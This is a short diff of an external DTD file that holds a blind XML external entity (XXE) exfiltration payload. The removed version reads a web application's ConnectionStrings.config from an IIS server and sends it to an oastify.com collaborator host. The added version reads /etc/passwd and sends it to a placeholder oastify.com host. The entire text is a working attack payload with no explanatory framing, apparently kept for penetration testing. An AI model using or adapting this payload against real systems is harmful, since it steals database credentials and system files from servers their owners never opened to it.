@@ -1,4 +1,5 @@
-<!ENTITY % file SYSTEM "file:///c:/inetpub/wwwroot/WebPlanificacion/ConnectionStrings.config">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?connections=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://XXXX.oastify.com/?data=%file;'>">
 %eval;
 %exfil;
+
